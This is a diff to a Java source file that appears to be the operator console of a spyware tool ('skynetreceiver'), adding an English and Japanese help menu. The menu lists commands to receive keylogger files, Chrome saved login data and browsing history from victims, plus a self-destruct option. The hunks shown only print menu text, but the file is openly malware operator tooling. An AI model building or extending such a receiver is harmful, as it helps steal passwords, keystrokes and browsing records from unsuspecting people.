@@ -1,5 +1,3 @@
-package skynetreceiver;
-
 import java.io.*;
 import java.net.*;
 import java.util.Calendar;
@@ -59,6 +57,8 @@ public class ashiatonikki_win
 	  } else if (random > 15 && random <= 20) {
 	  System.out.println("'Well, dreams, they feel real while we're in them right? Its only when we wake up then we realize that something was actually strange.' - Cobb, Inception");
 	  }
+	  System.out.println("Type \"help\" for help.");
+	  System.out.println("Type \"cls\" to clear the screen.");
 	  System.out.println("[+]=================================================================================================[+]");
 	  System.out.println("IP: " + InetAddress.getLocalHost().getHostAddress());
 	  for(;;) {
@@ -182,6 +182,37 @@ public class ashiatonikki_win
 			  for(int i = 0; i < 69; i++) {
 				  System.out.println("\n");
 			  }
+		  } else if (ch.matches("help")) {
+			  if (language == 1) { // eng
+				  System.out.println("[COMMANDS LIST]");
+				  System.out.println("help - open commands list");
+				  System.out.println("cls - clear screen");
+				  System.out.println("ip - show ip");
+				  System.out.println("1 - Receive Keylogger Files");
+				  System.out.println("2 - Receive Chrome Login Data (Encrypted)");
+				  System.out.println("5 - Receive Chrome History Data");
+				  System.out.println("3 - Quit");
+				  System.out.println("6 - Switch language to Japanese");
+				  System.out.println("7 - Switch language to Simplified Chinese");
+				  System.out.println("8 - Self-destruct");
+				  System.out.println("== END OF HELP PAGE == \n\n");
+			  } else if (language == 3) { // jpn
+				  System.out.println("[ヘルプページ]");
+				  System.out.println("help - アクションのリストを表示する");
+				  System.out.println("cls - 明確なインターフェース");
+				  System.out.println("ip - show ip");
+				  System.out.println("1 - キーボード履歴を受け取る");
+				  System.out.println("2 - ログインデータを受け取る");
+				  System.out.println("5 - インターネット履歴を受信する");
+				  System.out.println("3 - やめる");
+				  System.out.println("6 - 英語に変更する");
+				  System.out.println("7 - 中国語に変更");
+				  System.out.println("8 - 自己破壊");
+			  } else if (language == 4) { // chn
+				  System.out.println("Under Construction");
+			  }
+		  } else if (ch.matches("ip")) {
+			  System.out.println("IP: " + InetAddress.getLocalHost().getHostAddress());
 		  }
 	  }
   }
@@ -348,4 +379,3 @@ public class ashiatonikki_win
       	  }
         }
      }
-
